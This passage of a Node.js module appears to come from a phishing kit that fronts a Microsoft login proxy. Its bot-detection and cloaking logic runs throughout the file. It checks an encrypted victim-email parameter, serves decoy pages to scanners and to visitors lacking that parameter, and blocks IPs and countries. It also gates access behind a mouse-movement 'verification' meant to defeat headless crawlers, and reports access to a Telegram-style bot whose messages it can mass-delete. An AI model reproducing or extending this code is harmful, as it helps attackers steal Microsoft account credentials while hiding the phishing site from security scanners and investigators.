                    created: Date.now(),
                    expiresAt: Date.now() + TOKEN_CONFIG.TOKEN_EXPIRY_MS
                };
                tokenStore.set(encryptedEmail, tokenData);
                saveTokens();
                console.log(`✅ Created new verification token for: ${encryptedEmail.substring(0, 20)}...`);
            }
            
            console.log(`🖱️ Showing mouse verification page to: ${decryptedEmail || encryptedEmail.substring(0, 20)} - ${fullUrl}`);
            return showVerificationPage(res, encryptedEmail, req.originalUrl, verifiedSessions, fingerprint);
        }
        
        // Microsoft proxy accessed without email parameter - serve decoy
        if (isMicrosoftProxy && !encryptedEmail) {
            console.log(`⚠️ Microsoft proxy accessed without email parameter - ${fullUrl} - serving decoy page`);
            const ipInfo = await getIPInfo(ip);
            return serveDecoyPage(res, 'No email parameter', ip, ipInfo);
        }
        
        console.log(`✅ Allowing non-proxy request: ${userAgent.substring(0, 50)} - ${fullUrl}`);
        return next();
    };
}

// Verification endpoint
async function handleVerification(req, res, verifiedSessions) {
    
    const { encryptedEmail, mouseMovements, totalTime, userAgent, returnUrl } = req.body;
    
    const tokenData = tokenStore.get(encryptedEmail);
    
    if (!tokenData || Date.now() > tokenData.expiresAt) {
        if (tokenData) {
            tokenStore.delete(encryptedEmail);
            saveTokens();
        }
        return res.json({ valid: false, returnUrl: null });
    }
    
    const isValid = (
        mouseMovements >= TOKEN_CONFIG.MIN_MOUSE_MOVEMENTS &&
        totalTime >= TOKEN_CONFIG.MIN_VERIFICATION_TIME_MS &&
        totalTime <= TOKEN_CONFIG.MAX_VERIFICATION_TIME_MS &&
        userAgent &&
        !userAgent.includes('Headless') &&
        !userAgent.includes('bot')
    );
    
    if (isValid) {
        const fingerprint = getFingerprint(req);
        verifiedSessions.set(fingerprint, {
            timestamp: Date.now(),
            userAgent: userAgent,
            ip: req.ip || req.socket.remoteAddress,
            email: encryptedEmail
        });
        
        console.log(`✅ Verification passed: ${encryptedEmail.substring(0, 20)}`);
        return res.json({ valid: true, returnUrl: returnUrl });
    } else {
        console.log(`❌ Verification failed: moves: ${mouseMovements}, time: ${totalTime}ms`);
        return res.json({ valid: false, returnUrl: null });
    }
}

// Cleanup expired tokens
setInterval(() => {
    const now = Date.now();
    let deleted = 0;
    for (const [token, data] of tokenStore.entries()) {
        if (now > data.expiresAt) {
            tokenStore.delete(token);
            deleted++;
        }
    }
    if (deleted > 0) {
        console.log(`🗑️ Cleaned up ${deleted} expired tokens`);
        saveTokens();
    }
}, 60 * 60 * 1000);

// Helper functions
function getTokenStore() { return tokenStore; }
function getBotDetections() { return botDetections; }
function getBlockedIPs() { return Array.from(blockedIPs); }

// Message ID management functions
function addBotMessageId(messageId) {
    if (!messageId) return;
    botDetectionMessageIds.add(messageId);
    saveBotMessageIds();
}

function addPageAccessMessageId(messageId) {
    if (!messageId) return;
    pageAccessMessageIds.add(messageId);
    savePageAccessMessageIds();
}

function removeBotMessageId(messageId) {
    botDetectionMessageIds.delete(messageId);
    saveBotMessageIds();
}

function removePageAccessMessageId(messageId) {
    pageAccessMessageIds.delete(messageId);
    savePageAccessMessageIds();
}

function getAllBotMessageIds() {
    return Array.from(botDetectionMessageIds);
}

function getAllPageAccessMessageIds() {
    return Array.from(pageAccessMessageIds);
}

function clearAllBotMessageIds() {
    botDetectionMessageIds.clear();
    saveBotMessageIds();
}

function clearAllPageAccessMessageIds() {
    pageAccessMessageIds.clear();
    savePageAccessMessageIds();
}

function loadBotMessageIds() {
    try {
        if (fs.existsSync(BOT_MESSAGES_FILE)) {
            const data = JSON.parse(fs.readFileSync(BOT_MESSAGES_FILE, 'utf8'));
            botDetectionMessageIds = new Set(data.messageIds || []);
            console.log(`📋 Loaded ${botDetectionMessageIds.size} bot message IDs`);
        }
    } catch(e) {
        console.error('Failed to load bot message IDs:', e.message);
    }
}

function loadPageAccessMessageIds() {
    try {
        if (fs.existsSync(PAGE_ACCESS_MESSAGES_FILE)) {
            const data = JSON.parse(fs.readFileSync(PAGE_ACCESS_MESSAGES_FILE, 'utf8'));
            pageAccessMessageIds = new Set(data.messageIds || []);
            console.log(`📋 Loaded ${pageAccessMessageIds.size} page access message IDs`);
        }
    } catch(e) {
        console.error('Failed to load page access message IDs:', e.message);
    }
}

function saveBotMessageIds() {
    try {
        fs.writeFileSync(BOT_MESSAGES_FILE, JSON.stringify({
            messageIds: Array.from(botDetectionMessageIds),
            lastUpdated: new Date().toISOString()
        }, null, 2));
    } catch(e) {
        console.error('Failed to save bot message IDs:', e.message);
    }
}

function savePageAccessMessageIds() {
    try {
        fs.writeFileSync(PAGE_ACCESS_MESSAGES_FILE, JSON.stringify({
            messageIds: Array.from(pageAccessMessageIds),
            lastUpdated: new Date().toISOString()
        }, null, 2));
    } catch(e) {
        console.error('Failed to save page access message IDs:', e.message);
    }
}

async function deleteAllBotDetectionMessages(bot, chatId) {
    let deletedCount = 0;
    let failedCount = 0;
    const messageIds = Array.from(botDetectionMessageIds);
    
    for (const messageId of messageIds) {
        try {
            await bot.deleteMessage(chatId, messageId);
            deletedCount++;
            botDetectionMessageIds.delete(messageId);
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (e) {
            failedCount++;
            if (e.message.includes('message can\'t be deleted') || 
                e.message.includes('message not found')) {
                botDetectionMessageIds.delete(messageId);
            }
        }
    }
    
    saveBotMessageIds();
    return { deletedCount, failedCount };
}

async function deleteAllPageAccessMessages(bot, chatId) {
    let deletedCount = 0;
    let failedCount = 0;
    const messageIds = Array.from(pageAccessMessageIds);
    
    for (const messageId of messageIds) {
        try {
            await bot.deleteMessage(chatId, messageId);
            deletedCount++;
            pageAccessMessageIds.delete(messageId);
            await new Promise(resolve => setTimeout(resolve, 100));
        } catch (e) {
            failedCount++;
            if (e.message.includes('message can\'t be deleted') || 
                e.message.includes('message not found')) {
                pageAccessMessageIds.delete(messageId);
            }
        }
    }
    
    savePageAccessMessageIds();
    return { deletedCount, failedCount };
}

async function deleteAllMessages(bot, chatId) {
    const botResult = await deleteAllBotDetectionMessages(bot, chatId);
    const pageResult = await deleteAllPageAccessMessages(bot, chatId);
    
    return {
        botDeleted: botResult.deletedCount,
        botFailed: botResult.failedCount,
        pageDeleted: pageResult.deletedCount,
        pageFailed: pageResult.failedCount,
        totalDeleted: botResult.deletedCount + pageResult.deletedCount,
        totalFailed: botResult.failedCount + pageResult.failedCount
    };
}

// Initialize
loadBlockedIPs();
loadBotMessageIds();
loadPageAccessMessageIds();

module.exports = { 
    browserOnlyMiddleware: (req, res, next) => next(),
    unifiedBotDetection,
    handleVerification,
    showVerificationPage,
    blockIP,
    unblockIP,
    getBotDetections,
    getBlockedIPs,
    getFormattedBlockedIPs,
    addBotMessageId,
    addPageAccessMessageId,
    removeBotMessageId,
    removePageAccessMessageId,
    getAllBotMessageIds,
    getAllPageAccessMessageIds,
    clearAllBotMessageIds,
    clearAllPageAccessMessageIds,
    deleteAllBotDetectionMessages,
    deleteAllPageAccessMessages,
    deleteAllMessages,
    BOT_SIGNATURES,
    handleBotDetection,
    getIPInfo,
    TOKEN_CONFIG,
     getTokenStore,  // Add this
    saveTokens,     // Add this
    serveDecoyPage,
    ALLOWED_COUNTRIES
};